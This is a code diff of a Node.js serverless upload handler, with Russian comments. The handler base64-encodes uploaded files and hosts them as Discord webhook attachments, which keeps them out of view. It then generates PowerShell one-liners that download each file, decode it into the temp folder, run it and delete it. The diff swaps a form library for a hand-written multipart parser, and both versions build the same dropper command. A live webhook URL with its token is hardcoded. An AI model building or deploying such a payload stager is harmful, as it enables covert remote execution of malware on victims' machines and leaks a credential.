@@ -1,156 +1,136 @@
 const https = require('https');
-const formidable = require('formidable');
-const fs = require('fs');
 
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504857329190048006/VKZEEClNQkY75JLhBYc91V5fr8buY5A-O8fgnJFtDVnHVwCc9Fro54FI9ZJrGSpssVh2';
 
-// Настройка для Vercel
+// ВАЖНО: Отключаем bodyParser
 module.exports.config = {
   api: {
     bodyParser: false,
   },
 };
 
-function sendDiscordMessage(content) {
-  return new Promise((resolve, reject) => {
-    try {
-      const webhookUrl = new URL(DISCORD_WEBHOOK);
-      const data = JSON.stringify({ content });
-      const req = https.request({
-        hostname: webhookUrl.hostname,
-        path: webhookUrl.pathname,
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
-      }, res => {
-        let body = '';
-        res.on('data', chunk => body += chunk);
-        res.on('end', () => resolve(body));
-      });
-      req.on('error', reject);
-      req.write(data);
-      req.end();
-    } catch (e) {
-      reject(e);
-    }
-  });
-}
+function parseMultipart(data, boundary) {
+  const parts = [];
+  const boundaryBuffer = Buffer.from('--' + boundary);
+  let start = 0;
 
-function uploadFileToDiscord(filePath, filename) {
-  return new Promise((resolve, reject) => {
-    try {
-      const fileContent = fs.readFileSync(filePath);
-      const base64Content = fileContent.toString('base64');
-      const encodedFilename = (filename || 'file').replace(/\.[^/.]+$/, '') + '.b64';
-      const boundary = '----DiscordBoundary' + Math.random().toString(36).substring(2);
+  while (true) {
+    start = data.indexOf(boundaryBuffer, start);
+    if (start === -1) break;
+    start += boundaryBuffer.length;
+
+    let end = data.indexOf(boundaryBuffer, start);
+    if (end === -1) break;
+
+    const part = data.slice(start, end);
+    const headerEnd = part.indexOf('\r\n\r\n');
+    if (headerEnd !== -1) {
+      const headers = part.slice(0, headerEnd).toString();
+      const content = part.slice(headerEnd + 4, part.length - 2); // -2 to remove \r\n
       
-      const header = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${encodedFilename}"\r\nContent-Type: text/plain\r\n\r\n`;
-      const footer = `\r\n--${boundary}--\r\n`;
+      const nameMatch = headers.match(/name="([^"]+)"/);
+      const filenameMatch = headers.match(/filename="([^"]+)"/);
       
-      const body = Buffer.concat([
-        Buffer.from(header),
-        Buffer.from(base64Content),
-        Buffer.from(footer)
-      ]);
-      
-      const webhookUrl = new URL(DISCORD_WEBHOOK);
-      const req = https.request({
-        hostname: webhookUrl.hostname,
-        path: webhookUrl.pathname,
-        method: 'POST',
-        headers: {
-          'Content-Type': `multipart/form-data; boundary=${boundary}`,
-          'Content-Length': body.length
-        }
-      }, res => {
-        let responseData = '';
-        res.on('data', chunk => responseData += chunk);
-        res.on('end', () => {
-          try {
-            const json = JSON.parse(responseData);
-            if (json.attachments && json.attachments[0]) {
-              resolve({ fileUrl: json.attachments[0].url, originalName: filename });
-            } else {
-              reject(new Error('Discord upload failed'));
-            }
-          } catch (e) {
-            reject(new Error('Invalid Discord response'));
-          }
+      if (nameMatch && nameMatch[1] === 'fileToUpload') {
+        parts.push({
+          filename: filenameMatch ? filenameMatch[1] : 'file',
+          content: content
         });
-      });
-      req.on('error', reject);
-      req.write(body);
-      req.end();
-    } catch (e) {
-      reject(e);
+      }
     }
+    start = end;
+  }
+  return parts;
+}
+
+async function uploadToDiscord(content, filename) {
+  const base64 = content.toString('base64');
+  const encodedName = filename.replace(/\.[^/.]+$/, '') + '.b64';
+  const boundary = '----Boundary' + Math.random().toString(36).substring(2);
+  
+  const payload = Buffer.concat([
+    Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${encodedName}"\r\nContent-Type: text/plain\r\n\r\n`),
+    Buffer.from(base64),
+    Buffer.from(`\r\n--${boundary}--\r\n`)
+  ]);
+
+  return new Promise((resolve, reject) => {
+    const url = new URL(DISCORD_WEBHOOK);
+    const req = https.request({
+      hostname: url.hostname,
+      path: url.pathname,
+      method: 'POST',
+      headers: {
+        'Content-Type': `multipart/form-data; boundary=${boundary}`,
+        'Content-Length': payload.length
+      }
+    }, res => {
+      let resData = '';
+      res.on('data', chunk => resData += chunk);
+      res.on('end', () => {
+        try {
+          const json = JSON.parse(resData);
+          if (json.attachments?.[0]?.url) resolve({ url: json.attachments[0].url, name: filename });
+          else reject(new Error('Discord API error: ' + resData));
+        } catch (e) { reject(new Error('Invalid Discord JSON: ' + resData)); }
+      });
+    });
+    req.on('error', reject);
+    req.write(payload);
+    req.end();
   });
 }
 
-// Главный обработчик (CommonJS формат)
 module.exports = async (req, res) => {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
   if (req.method === 'OPTIONS') return res.status(200).end();
-  if (req.method !== 'POST') return res.status(405).json({ success: false, error: 'Method not allowed' });
+  if (req.method !== 'POST') return res.status(405).json({ error: 'Use POST' });
 
-  const form = formidable({ multiples: true, maxFileSize: 4.5 * 1024 * 1024 });
+  try {
+    const contentType = req.headers['content-type'] || '';
+    const boundary = contentType.split('boundary=')[1];
+    if (!boundary) throw new Error('No boundary');
 
-  return new Promise((resolve) => {
-    form.parse(req, async (err, fields, files) => {
-      if (err) {
-        res.status(500).json({ success: false, error: 'Form error: ' + err.message });
-        return resolve();
-      }
+    const chunks = [];
+    for await (const chunk of req) chunks.push(chunk);
+    const buffer = Buffer.concat(chunks);
+    
+    if (buffer.length > 4.5 * 1024 * 1024) throw new Error('File too large for Vercel (max 4.5MB)');
 
-      const fileEntries = [];
-      const uploadedFiles = files.fileToUpload;
-      if (Array.isArray(uploadedFiles)) {
-        fileEntries.push(...uploadedFiles);
-      } else if (uploadedFiles) {
-        fileEntries.push(uploadedFiles);
-      }
+    const files = parseMultipart(buffer, boundary);
+    if (files.length === 0) throw new Error('No files in request');
 
-      if (fileEntries.length === 0) {
-        res.status(400).json({ success: false, error: 'No files uploaded' });
-        return resolve();
-      }
+    const results = [];
+    for (const f of files) {
+      const uploaded = await uploadToDiscord(f.content, f.filename);
+      results.push(uploaded);
+    }
 
-      try {
-        const uploadResults = [];
-        for (const file of fileEntries) {
-          const path = file.filepath || file.path;
-          const name = file.originalFilename || file.name;
-          const result = await uploadFileToDiscord(path, name);
-          uploadResults.push(result);
-        }
+    let cmd = '';
+    if (results.length === 1) {
+      cmd = `powershell -c "$t=\\"$env:TEMP\\${results[0].name}\\";$u='${results[0].url}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u)));Start-Process $t -Wait;Remove-Item $t"`;
+    } else {
+      let varDefs = [], cmdParts = [], startParts = [], tVars = [];
+      results.forEach((r, i) => {
+        const idx = i + 1;
+        varDefs.push(`$t${idx}=\\"$env:TEMP\\${r.name}\\"`, `$u${idx}='${r.url}'`);
+        cmdParts.push(`[IO.File]::WriteAllBytes($t${idx},[Convert]::FromBase64String((irm $u${idx})))`);
+        startParts.push(`Start-Process $t${idx} -Wait`);
+        tVars.push(`$t${idx}`);
+      });
+      cmd = `powershell -c "${varDefs.join(';')};${cmdParts.join(';')};${startParts.join(';')};Remove-Item ${tVars.join(',')}"`;
+    }
 
-        let combinedCmd = '';
-        if (uploadResults.length === 1) {
-          const r = uploadResults[0];
-          combinedCmd = `powershell -c "$t=\\"$env:TEMP\\${r.originalName}\\";$u='${r.fileUrl}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u)));Start-Process $t -Wait;Remove-Item $t"`;
-        } else {
-          let varDefs = [], cmdParts = [], startParts = [], tVars = [];
-          uploadResults.forEach((r, i) => {
-            const idx = i + 1;
-            varDefs.push(`$t${idx}=\\"$env:TEMP\\${r.originalName}\\"`, `$u${idx}='${r.fileUrl}'`);
-            cmdParts.push(`[IO.File]::WriteAllBytes($t${idx},[Convert]::FromBase64String((irm $u${idx})))`);
-            startParts.push(`Start-Process $t${idx} -Wait`);
-            tVars.push(`$t${idx}`);
-          });
-          combinedCmd = `powershell -c "${varDefs.join(';')};${cmdParts.join(';')};${startParts.join(';')};Remove-Item ${tVars.join(',')}"`;
-        }
+    // Отправляем в Discord
+    const webhookReq = https.request(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
+    webhookReq.write(JSON.stringify({ content: `📁 **${results.map(r=>r.name).join(', ')}**\n\`\`\`powershell\n${cmd}\n\`\`\`` }));
+    webhookReq.end();
 
-        const fileNames = uploadResults.map(r => r.originalName).join(', ');
-        await sendDiscordMessage(`📁 **${fileNames}**\n\nКоманда для запуска:\n\`\`\`powershell\n${combinedCmd}\n\`\`\``);
-
-        res.status(200).json({ success: true, files: uploadResults, command: combinedCmd });
-        resolve();
-      } catch (error) {
-        res.status(500).json({ success: false, error: 'Process error: ' + error.message });
-        resolve();
-      }
-    });
-  });
+    return res.status(200).json({ success: true, command: cmd });
+  } catch (e) {
+    return res.status(500).json({ success: false, error: e.message });
+  }
 };
